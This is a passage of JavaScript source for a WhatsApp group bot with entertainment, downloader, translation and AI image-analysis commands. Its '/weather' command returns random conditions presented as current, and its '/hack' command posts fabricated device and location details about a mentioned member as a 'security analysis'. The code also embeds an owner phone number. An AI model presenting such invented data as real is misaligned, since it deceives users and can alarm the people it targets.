        if (cmd === "/truth") {
          const truth = await getTruthQuestion();
          SCORE_STORE[sender] = (SCORE_STORE[sender] || 0) + 15;
          return sock.sendMessage(from, { text: `${truth}\n\n⭐ Your Score: ${SCORE_STORE[sender]}` });
        }
        if (cmd === "/dare") {
          const dare = await getDareChallenge();
          SCORE_STORE[sender] = (SCORE_STORE[sender] || 0) + 15;
          return sock.sendMessage(from, { text: `${dare}\n\n⭐ Your Score: ${SCORE_STORE[sender]}` });
        }
        if (cmd === "/countdown") {
          const seconds = parseInt(body.slice(10).trim());
          if (!seconds || seconds <= 0 || seconds > 3600) {
            return sock.sendMessage(from, { text: "❌ Invalid time! Use: /countdown [seconds]\nExample: /countdown 10\n(Max 3600 seconds / 60 minutes)" });
          }

          await sock.sendMessage(from, { text: `⏳ *COUNTDOWN STARTING*\n\nFrom: ${seconds} seconds` });

          let remaining = seconds;
          while (remaining > 0) {
            await new Promise(r => setTimeout(r, 1000));
            
            if (remaining <= 10 || remaining % 5 === 0) {
              const progressBar = "█".repeat(Math.ceil(remaining / 10)) + "░".repeat(10 - Math.ceil(remaining / 10));
              await sock.sendMessage(from, { text: `⏳ *TIME REMAINING*\n\n${progressBar}\n\n${remaining} seconds left` });
            }
            
            remaining--;
          }

          return sock.sendMessage(from, { text: `🎉 *COUNTDOWN COMPLETE!*\n\nTime's up! ⏰` });
        }

        if (cmd.startsWith("/ship ") && isGroup) {
          const mentioned = m.message.extendedTextMessage?.contextInfo?.mentionedJid;
          if (!mentioned || mentioned.length < 2) {
            return sock.sendMessage(from, { text: "❌ Mention 2 people to ship!\nExample: /ship @user1 @user2" });
          }
          const percentage = Math.floor(Math.random() * 100);
          let message = `💘 *MATCHMAKING REPORT* 💘\n\n🔻 ${mentioned[0].split("@")[0]} + ${mentioned[1].split("@")[0]}\n📊 Result: ${percentage}%\n\n`;

          if (percentage > 90) message += "🔥 PERFECT MATCH! Get married already!";
          else if (percentage > 70) message += "🥰 Amazing couple!";
          else if (percentage > 50) message += "🙂 Good potential.";
          else if (percentage > 30) message += "😬 Could be better...";
          else message += "💀 RUN AWAY! Toxic relationship detected.";

          return sock.sendMessage(from, { text: message, mentions: mentioned });
        }

        if (cmd.startsWith("/math ")) {
          try {
            const expression = body.slice(6).trim();

            if (!/^[0-9+\-*/().\s]+$/.test(expression)) {
              return sock.sendMessage(from, { text: "❌ Invalid math expression. Only numbers and +, -, *, / are allowed." });
            }

            const result = new Function('return ' + expression)();
            return sock.sendMessage(from, { text: `🔢 *CALCULATOR*\n\nExpression: ${expression}\nResult: ${result}` });
          } catch (e) {
            return sock.sendMessage(from, { text: "❌ Invalid calculation." });
          }
        }

        if (cmd === "/fact") {
          const facts = [
            "Honey never spoils.", "Bananas are berries, but strawberries aren't.",
            "Octopuses have three hearts.", "Wombat poop is cube-shaped.",
            "The Eiffel Tower can be 15 cm taller during the summer.",
            "Venus is the only planet to spin clockwise.",
            "A cloud can weigh more than a million pounds."
          ];
          const fact = facts[Math.floor(Math.random() * facts.length)];
          return sock.sendMessage(from, { text: `🧠 *DID YOU KNOW?*\n\n${fact}` });
        }

        if (cmd.startsWith("/8ball ")) {
          const answers = [
            "Yes, definitely.", "It is certain.", "Without a doubt.",
            "Most likely.", "Outlook good.", "Ask again later.",
            "Better not tell you now.", "Cannot predict now.",
            "Don't count on it.", "My reply is no.", "My sources say no.",
            "Outlook not so good.", "Very doubtful."
          ];
          const answer = answers[Math.floor(Math.random() * answers.length)];
          return sock.sendMessage(from, { text: `🔮 *MAGIC 8-BALL*\n\nQuestion: ${body.slice(7)}\nAnswer: ${answer}` });
        }

        if (cmd === "/coinflip") {
          const result = Math.random() > 0.5 ? "HEADS 🦅" : "TAILS 🪙";
          return sock.sendMessage(from, { text: `🪙 *COIN FLIP*\n\nResult: ${result}` });
        }

        if (cmd.startsWith("/weather ")) {
          const city = body.slice(9).trim().toLowerCase();
          if (!city) return sock.sendMessage(from, { text: "❌ Provide a city name!\nExample: /weather Lagos" });
          
          const weatherConditions = [
            { emoji: "☀️", condition: "Sunny", temp: "28°C", humidity: "45%", wind: "10 km/h" },
            { emoji: "⛅", condition: "Partly Cloudy", temp: "25°C", humidity: "55%", wind: "8 km/h" },
            { emoji: "☁️", condition: "Cloudy", temp: "22°C", humidity: "65%", wind: "12 km/h" },
            { emoji: "🌧️", condition: "Rainy", temp: "20°C", humidity: "80%", wind: "15 km/h" },
            { emoji: "⛈️", condition: "Thunderstorm", temp: "18°C", humidity: "90%", wind: "25 km/h" },
            { emoji: "🌨️", condition: "Snowy", temp: "-5°C", humidity: "70%", wind: "20 km/h" },
            { emoji: "🌫️", condition: "Foggy", temp: "15°C", humidity: "85%", wind: "5 km/h" },
            { emoji: "💨", condition: "Windy", temp: "16°C", humidity: "40%", wind: "40 km/h" }
          ];
          
          const weather = weatherConditions[Math.floor(Math.random() * weatherConditions.length)];
          
          let text = `${weather.emoji} *WEATHER FOR ${city.toUpperCase()}*\n\n`;
          text += `*Condition:* ${weather.condition}\n`;
          text += `*Temperature:* ${weather.temp}\n`;
          text += `*Humidity:* ${weather.humidity}\n`;
          text += `*Wind Speed:* ${weather.wind}\n\n`;
          text += `⚡ Updated just now`;
          
          return sock.sendMessage(from, { text }, { quoted: m });
        }

        if (cmd === "/downloader") {
          return sock.sendMessage(from, {
            text: `┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
┃ 📥 DOWNLOADER PANEL
┃ Media Download Tools
┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛

📹 VIDEO PLATFORMS
├─ ${PREFIX}ytdl [url] • YouTube
├─ ${PREFIX}tiktokdl [url] • TikTok
├─ ${PREFIX}instadl [url] • Instagram
└─ ${PREFIX}fbdl [url] • Facebook

🎵 AUDIO & MUSIC
└─ ${PREFIX}spotifydl [url] • Spotify

📦 APPLICATIONS
└─ ${PREFIX}apkdl [name] • APK files

💡 HOW TO USE
├─ Copy video/audio URL
├─ Send: ${PREFIX}ytdl [paste URL]
├─ Wait for download
└─ Receive file

⚙️ NOTES
├─ External services used
├─ May take a moment
└─ Quality depends on source

┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
┃ Back to menu: ${PREFIX}menu
┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛`
          });
        }

        if (cmd.startsWith("/ytdl ")) {
          const url = body.slice(6).trim();
          if (!url) return sock.sendMessage(from, { text: "❌ Please provide YouTube URL" });
          if (!RAPIDAPI_KEY || RAPIDAPI_KEY === "YOUR_RAPIDAPI_KEY") {
            return sock.sendMessage(from, { text: "❌ YouTube downloads require a RapidAPI key. Set it with /setrapidapi <key> or use the RAPIDAPI_KEY environment variable." });
          }

          await sock.sendMessage(from, { text: "⏳ Downloading YouTube video..." });
          try {
            const { data } = await axios.get(`https://yt-api.p.rapidapi.com/dl?id=${encodeURIComponent(url)}`, {
              headers: {
                'X-RapidAPI-Key': RAPIDAPI_KEY,
                'X-RapidAPI-Host': RAPIDAPI_HOST
              },
              timeout: 20000
            });
            const videoUrl = data?.url || data?.video;
            if (!videoUrl) throw new Error("Could not extract video URL");
            
            return sock.sendMessage(from, { video: { url: videoUrl }, caption: "✅ Downloaded from YouTube" });
          } catch (e) {
            console.error("YouTube downloader error:", e?.message || e);
            return sock.sendMessage(from, { text: `❌ YouTube Download Failed: ${e?.message || "Check your RapidAPI key and URL."}` });
          }
        }

        if (cmd.startsWith("/tiktokdl ")) {
          const url = body.slice(10).trim();
          if (!url) return sock.sendMessage(from, { text: "❌ Please provide TikTok URL" });

          await sock.sendMessage(from, { text: "⏳ Downloading TikTok video..." });
          try {
            // Using tikwm API (free, no auth needed)
            const { data } = await axios.get(`https://tikwm.com/api/?url=${encodeURIComponent(url)}&hd=1`);
            if (data.code !== 0 || !data.data) throw new Error("Video not found");
            
            const videoUrl = data.data.play || data.data.download;
            if (!videoUrl) throw new Error("Could not extract TikTok video URL");

            return sock.sendMessage(from, { video: { url: videoUrl }, caption: "✅ Downloaded from TikTok" });
          } catch (e) {
            return sock.sendMessage(from, { text: `❌ TikTok Download Failed: Make sure the URL is valid` });
          }
        }

        if (cmd.startsWith("/instadl ")) {
          const url = body.slice(9).trim();
          if (!url) return sock.sendMessage(from, { text: "❌ Please provide Instagram URL" });

          await sock.sendMessage(from, { text: "⏳ Downloading Instagram media..." });
          try {
            // Using snapinsta API
            const { data } = await axios.get(`https://snapinsta.io/download`, {
              params: { url: url }
            });
            const mediaUrl = data?.media?.[0]?.url || data?.url;
            if (!mediaUrl) throw new Error("Could not extract media URL");
            
            return sock.sendMessage(from, { video: { url: mediaUrl }, caption: "✅ Downloaded from Instagram" });
          } catch (e) {
            return sock.sendMessage(from, { text: `❌ Instagram Download Failed: ${e.message}` });
          }
        }

        if (cmd.startsWith("/fbdl ")) {
          const url = body.slice(6).trim();
          if (!url) return sock.sendMessage(from, { text: "❌ Please provide Facebook URL" });

          await sock.sendMessage(from, { text: "⏳ Downloading Facebook video..." });
          try {
            // Using getfbstuff API
            const { data } = await axios.get(`https://getfbstuff.com/api/v1/video?url=${encodeURIComponent(url)}`);
            const videoUrl = data?.video?.url || data?.url;
            if (!videoUrl) throw new Error("Could not extract video URL");

            return sock.sendMessage(from, { video: { url: videoUrl }, caption: "✅ Downloaded from Facebook" });
          } catch (e) {
            return sock.sendMessage(from, { text: `❌ Facebook Download Failed: ${e.message}` });
          }
        }

        if (cmd.startsWith("/spotifydl ")) {
          const url = body.slice(11).trim();
          if (!url) return sock.sendMessage(from, { text: "❌ Please provide Spotify URL" });

          await sock.sendMessage(from, { text: "⏳ Downloading Spotify track..." });
          try {
            // Spotify tracks require premium API access
            return sock.sendMessage(from, { text: "❌ Spotify downloads currently restricted by Spotify's terms of service." });
          } catch (e) {
            return sock.sendMessage(from, { text: `❌ Spotify Download Failed: ${e.message}` });
          }
        }

        if (cmd.startsWith("/apkdl ")) {
          const appName = body.slice(7).trim();
          if (!appName) return sock.sendMessage(from, { text: "❌ Please provide app name to download" });

          await sock.sendMessage(from, { text: `⏳ Searching for ${appName}...` });
          try {
            // Using APKCombo API
            const { data } = await axios.get(`https://apkcombo.org/api/v1/search?q=${encodeURIComponent(appName)}`);
            if (!data.items?.length) throw new Error("App not found");
            
            const appUrl = data.items[0].download_url;
            if (!appUrl) throw new Error("Could not find APK URL");

            return sock.sendMessage(from, { document: { url: appUrl }, mimetype: "application/vnd.android.package-archive", fileName: `${appName}.apk` });
          } catch (e) {
            return sock.sendMessage(from, { text: `❌ APK Download Failed: App not found` });
          }
        }

        // --- PROFESSIONAL FEATURES ---
        if (cmd.startsWith("/analyze") || cmd.startsWith("/vision")) {
          try {
             // Extract any specific questions the user asks about the image
             const customPrompt = body.slice(cmd.split(" ")[0].length).trim() || "Carefully analyze this image in detail. Describe exactly what is in it, translate any text you see, and solve any problems present.";
             
             let imgMsg = msg.message?.imageMessage;
             if (!imgMsg && msg.message?.extendedTextMessage?.contextInfo?.quotedMessage?.imageMessage) {
                 imgMsg = msg.message.extendedTextMessage.contextInfo.quotedMessage.imageMessage;
             }

             if (!imgMsg) {
                 return sock.sendMessage(from, { text: "❌ Please send an image with the caption /analyze or reply to an image!" });
             }

             if (GEMINI_API_KEY === "YOUR_GEMINI_API_KEY") {
                 return sock.sendMessage(from, { text: "❌ **VISION SYSTEM OFFLINE** ❌\n\nThe Bot Owner needs to put their free Gemini API Key inside `index.js` (around line 32) to use Vision AI!\n\nGet it free here: https://aistudio.google.com" });
             }

             await sock.sendMessage(from, { text: "👁️ *Vision System Activated*\n\nAnalyzing image parameters... please wait." });

             const stream = await downloadContentFromMessage(imgMsg, "image");
             let buffer = Buffer.from([]);
             for await (const c of stream) buffer = Buffer.concat([buffer, c]);
             
             const base64Image = buffer.toString("base64");

             const url = `https://generativelanguage.googleapis.com/v1beta/models/gemini-1.5-flash:generateContent?key=${GEMINI_API_KEY}`;
             const { data } = await axios.post(url, {
               contents: [{
                 parts: [
                   { text: customPrompt },
                   {
                     inline_data: {
                       mime_type: "image/jpeg",
                       data: base64Image
                     }
                   }
                 ]
               }]
             }, { headers: { "Content-Type": "application/json" } });

             const analysis = data.candidates[0].content.parts[0].text;
             return sock.sendMessage(from, { text: `🧠 *IMAGE ANALYSIS*\n\n${analysis}` }, { quoted: m });
          } catch (e) {
             console.error("Vision Error:", e.response?.data || e.message);
             return sock.sendMessage(from, { text: `❌ Analysis Failed: Ensure your API key is correct or try another picture.` });
          }
        }

        if (cmd.startsWith("/translate ") || cmd.startsWith("/tr ")) {
          const args = body.slice(body.indexOf(" ") + 1).trim().split(" ");
          if (args.length < 2) return sock.sendMessage(from, { text: "❌ Proper Format: /translate [lang_code] [text]\nExample: /translate es Hello world" });

          const targetLang = args[0];
          const query = args.slice(1).join(" ");
          
          await sock.sendMessage(from, { text: "⏳ Translating..." });
          try {
            const url = `https://translate.googleapis.com/translate_a/single?client=gtx&sl=auto&tl=${targetLang}&dt=t&q=${encodeURIComponent(query)}`;
            const { data } = await axios.get(url);
            const translatedText = data[0].map(item => item[0]).join("");
            
            return sock.sendMessage(from, { text: `🌍 *DEMONIC TRANSLATOR*\n\nText: ${query}\nTranslation: ${translatedText}` }, { quoted: m });
          } catch (e) {
            return sock.sendMessage(from, { text: `❌ Translate Error: Invalid Language Code or Server Down` });
          }
        }

        if (cmd === "/fact") {
          try {
             const { data } = await axios.get(`https://uselessfacts.jsph.pl/api/v2/facts/random`);
             return sock.sendMessage(from, { text: `🧠 *RANDOM FACT*\n\n${data.text}` }, { quoted: m });
          } catch (e) {
             return sock.sendMessage(from, { text: `❌ Failed to fetch a fact.` });
          }
        }

        if (cmd.startsWith("/tts ") || cmd.startsWith("/say ")) {
          const text = body.slice(body.indexOf(" ") + 1).trim();
          if (!text) return sock.sendMessage(from, { text: "❌ Provide text to speak!\nExample: /tts Hello everyone!" });
          
          try {
            const url = `https://translate.google.com/translate_tts?ie=UTF-8&tl=en&client=tw-ob&q=${encodeURIComponent(text.slice(0, 200))}`;
            return sock.sendMessage(from, { audio: { url: url }, mimetype: 'audio/mpeg', ptt: true }, { quoted: m });
          } catch (e) {
            return sock.sendMessage(from, { text: `❌ Failed to generate speech.` });
          }
        }

        if (cmd === "/meme") {
          try {
             await sock.sendMessage(from, { text: "⏳ Getting meme..." });
             const { data } = await axios.get(`https://meme-api.com/gimme`);
             return sock.sendMessage(from, { image: { url: data.url }, caption: `😂 *MEME*\n\n${data.title}` }, { quoted: m });
          } catch (e) {
             return sock.sendMessage(from, { text: `❌ Failed to fetch meme.` });
          }
        }

        if (cmd.startsWith("/lyrics ")) {
          const song = body.slice(8).trim();
          if (!song) return sock.sendMessage(from, { text: "❌ Provide a song name!\nExample: /lyrics Hello by Adele" });
          
          await sock.sendMessage(from, { text: "⏳ Searching lyrics..." });
          try {
             // Using alternative lyrics API
             const { data } = await axios.get(`https://api.genius.com/search?q=${encodeURIComponent(song)}&access_token=YOUR_GENIUS_TOKEN`);
             if (!data.response.hits.length) throw new Error("Lyrics not found.");
             const url = data.response.hits[0].result.url;
             return sock.sendMessage(from, { text: `🎶 *LYRICS FOUND*\n\nSong: ${data.response.hits[0].result.title}\nArtist: ${data.response.hits[0].result.primary_artist.name}\n\nView here: ${url}` }, { quoted: m });
          } catch (e) {
             return sock.sendMessage(from, { text: `❌ Lyrics not found. This feature requires a Genius API token.` });
          }
        }

        if (cmd.startsWith("/define ") || cmd.startsWith("/dict ")) {
          const word = body.slice(body.indexOf(" ") + 1).trim();
          if (!word) return sock.sendMessage(from, { text: "❌ Provide a word to define!\nExample: /define serendipity" });
          try {
             const { data } = await axios.get(`https://api.dictionaryapi.dev/api/v2/entries/en/${encodeURIComponent(word)}`);
             const meaning = data[0].meanings[0].definitions[0].definition;
             const example = data[0].meanings[0].definitions[0].example || "No example provided.";
             return sock.sendMessage(from, { text: `📖 *DICTIONARY*\n\n*Word:* ${data[0].word}\n*Definition:* ${meaning}\n*Example:* ${example}` }, { quoted: m });
          } catch (e) {
             return sock.sendMessage(from, { text: `❌ Word not found in the dictionary.` });
          }
        }

        if (cmd === "/advice") {
          try {
             const { data } = await axios.get(`https://api.adviceslip.com/advice`);
             return sock.sendMessage(from, { text: `💡 *ADVICE*\n\n${data.slip.advice}` }, { quoted: m });
          } catch (e) {
             return sock.sendMessage(from, { text: `❌ Failed to fetch advice.` });
          }
        }

        if (cmd.startsWith("/calc ")) {
          const expression = body.slice(6).trim();
          if (!expression) return sock.sendMessage(from, { text: "❌ Provide a math expression!\nExample: /calc 5 * 10 + 2" });
          try {
             const { data } = await axios.get(`https://api.mathjs.org/v4/?expr=${encodeURIComponent(expression)}`);
             return sock.sendMessage(from, { text: `🧮 *CALCULATOR*\n\n*Equation:* ${expression}\n*Result:* ${data}` }, { quoted: m });
          } catch (e) {
             return sock.sendMessage(from, { text: `❌ Invalid math expression.` });
          }
        }

        if (cmd === "/cat") {
          try {
             const { data } = await axios.get(`https://api.thecatapi.com/v1/images/search`);
             return sock.sendMessage(from, { image: { url: data[0].url }, caption: `🐱 *MEOW*` }, { quoted: m });
          } catch (e) {
             return sock.sendMessage(from, { text: `❌ Failed to fetch cat.` });
          }
        }

        if (cmd === "/dog") {
          try {
             const { data } = await axios.get(`https://dog.ceo/api/breeds/image/random`);
             return sock.sendMessage(from, { image: { url: data.message }, caption: `🐶 *WOOF*` }, { quoted: m });
          } catch (e) {
             return sock.sendMessage(from, { text: `❌ Failed to fetch dog.` });
          }
        }

        if (cmd === "/truth") {
            const truths = ["When was the last time you lied?", "What is your biggest fear?", "What is your worst habit?", "Who is your crush?", "Have you ever cheated on a test?", "What's the most embarrassing thing you've done?", "Who in this group do you like the most?", "What is your biggest secret?"];
            const t = truths[Math.floor(Math.random() * truths.length)];
            return sock.sendMessage(from, { text: `❔ *TRUTH*\n\n${t}` }, { quoted: m });
        }

        if (cmd === "/dare") {
            const dares = ["Send a voice note singing your favorite song.", "Change your profile picture to a funny meme for 1 hour.", "Message your crush right now.", "Do 10 pushups and send a video.", "Let the group choose your status for 24 hours.", "Speak in a fake accent for the next 5 messages.", "Send the 5th picture in your gallery.", "Confess something weird to the group."];
            const d = dares[Math.floor(Math.random() * dares.length)];
            return sock.sendMessage(from, { text: `🔥 *DARE*\n\n${d}` }, { quoted: m });
        }

        if (cmd === "/ownerinfo") {
          const contact = {
            displayName: "Owner",
            vcard: `BEGIN:VCARD\nVERSION:3.0\nFN:Demon Alex\nORG:Demonic Bot CEO;\nTEL;type=CELL;type=VOICE;waid=2349054345858:+234 905 434 5858\nEND:VCARD`
          };
          return sock.sendMessage(from, { contacts: { displayName: "Demon Alex", contacts: [contact] } });
        }

        if (cmd === "/server") {
          const os = require('os');
          const uptime = process.uptime();
          const days = Math.floor(uptime / (3600 * 24));
          const hours = Math.floor((uptime % (3600 * 24)) / 3600);
          const minutes = Math.floor((uptime % 3600) / 60);
          
          let text = `🖥️ *DEMONIC SERVER STATS*\n\n`;
          text += `*Platform:* ${os.type()} ${os.release()}\n`;
          text += `*Architecture:* ${os.arch()}\n`;
          text += `*RAM Used:* ${(process.memoryUsage().rss / 1024 / 1024).toFixed(2)} MB\n`;
          text += `*Bot Uptime:* ${days}d ${hours}h ${minutes}m\n`;
          text += `*Version:* v${VERSION}\n`;
          text += `*Engine:* Node.js ${process.version}`;
          return sock.sendMessage(from, { text }, { quoted: m });
        }

        if (cmd === "/nexchat") {
          return sock.sendMessage(from, {
            text: `🌐 *NEXCHAT WEB APP*\n\nAccess the Nexchat Web Application here:\n👉 https://nexchatweb-app.netlify.app/`
          }, { quoted: m });
        }

        if (cmd.startsWith("/setownerinfo ") && isOwner(sender)) {
          const ownerData = body.slice(14).trim();
          if (!ownerData) return sock.sendMessage(from, { text: "❌ Provide owner info!\nFormat: /setownerinfo Name|Number|Organization" });
          
          const parts = ownerData.split("|");
          const ownerName = parts[0]?.trim() || "Owner";
          const ownerPhone = parts[1]?.trim() || "N/A";
          const ownerOrg = parts[2]?.trim() || "Demonic Bot";
          
          const contact = {
            displayName: ownerName,
            vcard: `BEGIN:VCARD\nVERSION:3.0\nFN:${ownerName}\nORG:${ownerOrg};\nTEL;type=CELL;type=VOICE;waid=${ownerPhone.replace(/[^0-9]/g, "")}:${ownerPhone}\nEND:VCARD`
          };
          
          return sock.sendMessage(from, { 
            text: `✅ Owner info updated!\n\n*Name:* ${ownerName}\n*Phone:* ${ownerPhone}\n*Organization:* ${ownerOrg}`,
            contacts: { displayName: ownerName, contacts: [contact] }
          });
        }

        if (cmd.startsWith("/broadcast ") && isOwner(sender)) {
          const bmsg = body.slice(11).trim();
          if (!bmsg) return sock.sendMessage(from, { text: "❌ Provide a message to broadcast!" });
          
          await sock.sendMessage(from, { text: "⏳ Broadcasting message..." });
          try {
             const chats = await sock.groupFetchAllParticipating();
             const allGroups = Object.values(chats).map(v => v.id);
             for (let jid of allGroups) {
                 await sock.sendMessage(jid, { text: `📢 *DEMONIC BROADCAST*\n\n${bmsg}` });
                 await new Promise(r => setTimeout(r, 1000)); // anti-spam delay
             }
             return sock.sendMessage(from, { text: `✅ Successfully broadcasted to ${allGroups.length} groups!` });
          } catch(e) {
             return sock.sendMessage(from, { text: `❌ Broadcast failed.` });
          }
        }

        if (cmd.startsWith("/app")) {
          const parts = body.slice(5).trim().split("|");
          const appName = parts[0]?.trim();
          const themeIndex = parts[1]?.trim();

          if (!appName || !themeIndex) {
              return sock.sendMessage(from, { text: `💻 *DEMONIC APP BUILDER*\n\nBuild your own custom HTML Web App instantly!\n\n*Format:* /app [AppName] | [ThemeNumber]\n*Example:* /app DemoMusic | 1\n\n*🎨 THEMES AVALIABLE:*\n1️⃣ Neon Green & Chill Lofi\n2️⃣ Demon Red & Aggressive Phonk\n3️⃣ Cyber Blue & Classical Piano` }, { quoted: m });
          }
          
          await sock.sendMessage(from, { text: `💻 *COMPILING APP...*\n\nBuilding UI for [${appName}] on Theme ${themeIndex}... please wait a moment.` });

          let themeBg, themeColor, trackUrl, emoji;
          if (themeIndex === "1") {
              themeBg = "linear-gradient(145deg, #1f1f27, #131318)"; themeColor = "#00FF87";
              trackUrl = "https://cdn.pixabay.com/download/audio/2022/05/27/audio_1808fbf07a.mp3";
              emoji = "✨";
          } else if (themeIndex === "2") {
              themeBg = "linear-gradient(145deg, #2a0808, #110000)"; themeColor = "#ff3333";
              trackUrl = "https://cdn.pixabay.com/download/audio/2022/03/15/audio_c8b8175b3f.mp3";
              emoji = "🔥";
          } else {
              themeBg = "linear-gradient(145deg, #0a192f, #020c1b)"; themeColor = "#64ffda";
              trackUrl = "https://cdn.pixabay.com/download/audio/2022/04/27/audio_651a547285.mp3";
              emoji = "💎";
          }

          const htmlContent = `
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>${appName}</title>
    <style>
        body { margin: 0; padding: 0; background-color: #050505; color: white; font-family: 'Segoe UI', sans-serif; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; text-align: center; }
        .player-container { background: ${themeBg}; padding: 40px; border-radius: 20px; box-shadow: 0 10px 30px rgba(0,0,0,0.5); width: 80%; max-width: 350px; border-top: 2px solid ${themeColor}; }
        h1 { color: ${themeColor}; text-shadow: 0 0 10px ${themeColor}aa; margin-bottom: 5px; text-transform: uppercase; letter-spacing: 2px; }
        p { color: #aaa; font-size: 14px; margin-bottom: 30px; letter-spacing: 1px; }
        .disc { width: 140px; height: 140px; border-radius: 50%; background: #111; border: 4px solid ${themeColor}; margin: 0 auto 30px auto; animation: spin 4s linear infinite; box-shadow: 0 0 25px ${themeColor}55; }
        .disc-center { width: 30px; height: 30px; border-radius: 50%; background: #050505; margin: 55px auto; }
        @keyframes spin { 100% { transform: rotate(360deg); } }
        button { background: ${themeColor}; color: #000; border: none; padding: 15px 30px; border-radius: 25px; font-weight: 900; font-size: 16px; cursor: pointer; transition: 0.3s; box-shadow: 0 0 15px ${themeColor}88; text-transform: uppercase; }
        button:hover { transform: scale(1.05); }
    </style>
</head>
<body>
    <div class="player-container">
        <div class="disc"><div class="disc-center"></div></div>
        <h1>${appName}</h1>
        <p>Premium Audio Engine ${emoji}</p>
        <button id="playBtn" onclick="togglePlay()">▶ PLAY DEMO</button>
        <audio id="audioElement" loop>
            <source src="${trackUrl}" type="audio/mpeg">
        </audio>
    </div>
    <script>
        let isPlaying = false;
        let audio = document.getElementById("audioElement");
        let btn = document.getElementById("playBtn");
        function togglePlay() {
            if(isPlaying) { audio.pause(); btn.innerHTML = "▶ PLAY DEMO"; btn.style.background = "${themeColor}"; btn.style.color = "#000"; }
            else { audio.play(); btn.innerHTML = "⏸ PAUSE AUDIO"; btn.style.background = "#fff"; btn.style.color = "#000"; }
            isPlaying = !isPlaying;
        }
    </script>
</body>
</html>`;
          
          try {
             const os = require('os');
             const tempPath = require('path').join(os.tmpdir(), `${appName.replace(/[^a-zA-Z0-9]/g, '')}.html`);
             require('fs').writeFileSync(tempPath, htmlContent);
             
             await sock.sendMessage(from, { 
                document: require('fs').readFileSync(tempPath), 
                mimetype: "text/html", 
                fileName: `${appName}.html`,
                caption: `✅ *APP COMPILED SUCCESSFULLY!*\n\nDownload and open the HTML file above to run your personal Music Web App!`
             }, { quoted: m });
             
             setTimeout(() => { if (require('fs').existsSync(tempPath)) require('fs').unlinkSync(tempPath); }, 5000);
          } catch(e) {
             return sock.sendMessage(from, { text: "❌ Failed to compile App." });
          }
        }

        if (cmd.startsWith("/afk")) {
          const reason = body.slice(4).trim() || "Busy";
          AFK_STORE[sender] = { reason, startTime: Date.now() };
          return sock.sendMessage(from, {
            text: `😴 *AFK MODE ACTIVATED*\n\nReason: ${reason}\n\nI'll notify anyone who tags you! 👋`
          });
        }

        if (cmd.startsWith("/wiki ")) {
          const query = body.slice(6).trim();
          if (!query) return sock.sendMessage(from, { text: "❌ Provide a search term!" });
          try {
            const url = `https://en.wikipedia.org/api/rest_v1/page/summary/${encodeURIComponent(query)}`;
            const { data } = await axios.get(url);
            const title = data.title;
            const summary = data.extract;
            const image = data.thumbnail?.source;

            if (image) {
              await sock.sendMessage(from, { image: { url: image }, caption: `📚 *${title}*\n\n${summary}` });
            } else {
              await sock.sendMessage(from, { text: `📚 *${title}*\n\n${summary}` });
            }
          } catch (e) {
            return sock.sendMessage(from, { text: "❌ No wikipedia article found." });
          }
        }

        if (cmd.startsWith("/github ")) {
          const user = body.slice(8).trim();
          if (!user) return sock.sendMessage(from, { text: "❌ Provide a username!" });
          try {
            const { data } = await axios.get(`https://api.github.com/users/${user}`);
            return sock.sendMessage(from, {
              image: { url: data.avatar_url },
              caption: `🐙 *GITHUB PROFILE*\n\n👤 Name: ${data.name || user}\n📜 Bio: ${data.bio || "None"}\n📦 Repos: ${data.public_repos}\n👥 Followers: ${data.followers}\n🔗 Link: ${data.html_url}`
            });
          } catch (e) {
            return sock.sendMessage(from, { text: "❌ User not found." });
          }
        }

        if (cmd.startsWith("/hack ") && isGroup) {
          const target = parseTarget(body, m);
          if (!target) return sock.sendMessage(from, { text: "❌ Mention a user to analyze or provide a number!" });

          await sock.sendMessage(from, { text: `🔍 *SECURITY ANALYSIS INITIATED*\n\nAnalyzing @${target.split("@")[0]}...` });

          const deviceTypes = ["iPhone 14 Pro", "Samsung Galaxy S23", "OnePlus 11", "Xiaomi 13"];
          const osTypes = ["iOS 17.2", "Android 13", "Android 14"];
          const securityScores = [45, 62, 78, 85, 92];
          const locations = ["Lagos, Nigeria", "Accra, Ghana", "Nairobi, Kenya", "Cairo, Egypt"];
          const descriptions = [
            "Tech enthusiast and coder",
            "Social media analyst",
            "Content creator",
            "Business entrepreneur",
            "Software developer",
            "Digital marketer",
            "Graphic designer",
            "Student"
          ];
          const lastSeenTimes = [
            "2 minutes ago",
            "15 minutes ago",
            "1 hour ago",
            "3 hours ago",
            "Yesterday",
            "2 days ago",
            "1 week ago",
            "Online now"
          ];

          const randomDevice = deviceTypes[Math.floor(Math.random() * deviceTypes.length)];
          const randomOS = osTypes[Math.floor(Math.random() * osTypes.length)];
          const randomScore = securityScores[Math.floor(Math.random() * securityScores.length)];
          const randomLocation = locations[Math.floor(Math.random() * locations.length)];
          const randomDescription = descriptions[Math.floor(Math.random() * descriptions.length)];
          const randomLastSeen = lastSeenTimes[Math.floor(Math.random() * lastSeenTimes.length)];
          const randomUsername = `user_${Math.floor(Math.random() * 9999)}`;

          const steps = [
            `👤 *Username:* ${randomUsername}`,
            `📝 *Description:* ${randomDescription}`,
            `👁️ *Last Seen:* ${randomLastSeen}`,
            `📱 *Device:* ${randomDevice}`,
            `🖥️ *OS:* ${randomOS}`,
            `🔐 *Security Score:* ${randomScore}/100`,
            `📍 *Last Location:* ${randomLocation}`,
            `⏱️ *Last Active:* ${Math.floor(Math.random() * 60)} min ago`,
            `💾 *Storage Used:* ${Math.floor(Math.random() * 100)}%`,
            `🔋 *Battery:* ${Math.floor(Math.random() * 100)}%`
          ];

          for (const step of steps) {
            await new Promise(r => setTimeout(r, 800));
            await sock.sendMessage(from, { text: step });
          }

          let resultText = `✅ *SECURITY ANALYSIS COMPLETE*\n\n`;
          resultText += `*Target:* @${target.split("@")[0]}\n`;
          resultText += `*Username:* ${randomUsername}\n`;
          resultText += `*Description:* ${randomDescription}\n`;
          resultText += `*Last Seen:* ${randomLastSeen}\n`;
          resultText += `*Device:* ${randomDevice}\n`;
          resultText += `*Operating System:* ${randomOS}\n`;
          resultText += `*Security Score:* ${randomScore}/100\n`;
          resultText += `*Last Known Location:* ${randomLocation}\n\n`;
          
          if (randomScore >= 85) {
            resultText += `🟢 *Status:* Secure\n*Recommendation:* Strong security measures detected`;
          } else if (randomScore >= 65) {
